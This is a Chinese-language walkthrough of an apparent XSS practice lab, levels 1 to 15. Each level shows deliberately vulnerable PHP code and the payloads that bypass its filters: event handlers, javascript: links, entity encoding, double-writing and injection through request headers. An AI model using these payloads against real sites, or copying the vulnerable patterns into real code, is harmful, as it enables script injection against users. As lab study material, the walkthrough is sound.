参考链接：[https://www.cnblogs.com/bmjoker/p/9446472.html](https://www.cnblogs.com/bmjoker/p/9446472.html)<br />在线处理XSS：[https://evilcos.me/lab/xssor/](https://evilcos.me/lab/xssor/)<br />-----------------------------<br />Level 1：
```php
<?php 
  ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```
常规输入：payload：name = <script>alert('XSS')</script><br />Level 2：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
```
调用了这个解析函数：.htmlspecialchars($str). 把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体,当页面被加载时，特定字符不会被解析，直接输出。字符包括：& " ' < > <br />预定义的字符是：

- & （和号）成为 &
- " （双引号）成为 "
- ' （单引号）成为 '
- < （小于）成为 <
- > （大于）成为 >

效果：把预定义的字符转换为 HTML 实体，等于<不能用，这时候一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：<br />payload： key=" onclick=alert(1)这样需要点击一下输入框<br> 没成功<br />另一种方法是 提前闭合标签 ：keyword="><script>alert(1)</script> <br />Level 3：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```
上题尝试闭合<"">构造<script>弹窗方法失效了，因为value中的<被转义了，只能使用js事件触发<br />payload ：value = ' ' onmouseover=alert(1)// '>    解释： '闭合value，//注释掉后面的语句<br />Level 4：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
此函数将变量str中的字符>转换为空，转换时区分大小写。同理将<装换为空<br />在这里可以构造一个输入到文本框后出现相应的事件(不需要<标签闭合的事件>）<br />payload：" onfocus=alert(1) autofocus="<br />   " onclick=alert(1) // <br />Level 5：
```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
<script 转换成 <scr_ipt ，on转换成 o_n ，这样就过滤了js事件，$str = strtolower($_GET["keyword"]);这样大小写绕过也失效，不过这次没有过滤尖括号<>，这里使用伪协议来构造payload：
```php
"><iframe src=javascript:alert(1)>

"> <a href="javascript:alert(1)">bmjoker</a>

"> <a href="javascript:%61lert(1)">bmjoker</a> //
```
这样的话： <input name=keyword value="  "><iframe src=javascript:alert(1)>"><br />用a标签绕过：payload ：keyword=:"><a href="javascript:alert(/xss)">点我触发</a><br />Level 6：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
相比上一关，没有大小写过滤，所以：
```php
"> <Script>alert(1)</script> 

"> <img Src=x OnError=alert(1)> 

"><a HrEf="javascript:alert(1)">bmjoker</a>

"><svg x=" " Onclick=alert(1)>

"><ScriPt>alert(1)<sCrIpt>"

" OncliCk=alert(1) 
```
Level7 :
```php
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
过滤了这么多，可以双写绕过<br />Level 8：
```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
```
可用字符：<> ， ' ,% ，# ，&，用编码代替html实体 ：[https://www.qqxiuzi.cn/bianma/zifushiti.php](https://www.qqxiuzi.cn/bianma/zifushiti.php)<br />payload：javascrip&#x74;:alert(1)     t-->&#x74；<br />Level 9 ：
```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```
```php
javascrip&#x74;:alert(1)//http://xxx.com  //利用注释

javascrip&#x74;:%0dhttp://xxx.com%0dalert(1)  //不利用注释

javascrip&#x74;:%0ahttp://xxx.com%0dalert(1)  //不利用注释
```
Level 10：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```
分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框
```php
True:?t_sort=test" onclick=alert(10) type=text
keyword = test&t_sort="type="text" onclick = "alert(1)

keyword = test&t_sort="type="text" onmouseover="alert(1)

keyword = test&t_sort="type="text" onmouseover=alert`1`
```
分析过程再参考：[https://blog.csdn.net/wangyuxiang946/article/details/118582886](https://blog.csdn.net/wangyuxiang946/article/details/118582886)

Level 11：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
```
第一个参数：keyword 使用 htmlspecialchars() 转译 并输出到页面 , 难度较大<br />第二个参数： t_sort , 使用 htmlspecialchars() 转译后拼接到 value值 , 难度相对较大<br />第三个参数 HTTP_REFERER , 过滤了尖括号 <> 后拼接到value值 , 难度较小。可以考虑到添加事件<br />用BP添加referer头，参数会作为$str33拼接。<br />payload：Referer:" onclick=alert(11) type=text<br />参考链接：[https://blog.csdn.net/wangyuxiang946/article/details/118583225](https://blog.csdn.net/wangyuxiang946/article/details/118583225)<br />左侧双引号用于闭合value拼接。BP-forword之后点击文本框即可

Level 12：
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```
跟上一关差不多，只是修改的参数变成了user_agent，payload可以照用

Level 13：
```php
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21885817/1647420881474-8146b1c7-a213-45ca-a643-64e42b3bc29e.png#clientId=ufa6e2e48-5c9e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=18&id=u532ee4aa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=22&originWidth=498&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5128&status=done&style=none&taskId=u965fadfc-2122-443b-a440-d8fcf2b79d7&title=&width=398.4)<br />这一句使发送包的时候会设置Cookie，所以要在修改数据包Cookie项，构造类似上两个的事件触发<br />Payload：Cookie:user=call+me+maybe%3F" onclick=alert(11) type=text<br />Level 14：<br />考察exif XSS ，<br />在上传图片的属性处插入：<script>alert(1)</script><br />解析时触发弹窗

Level15
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>

```
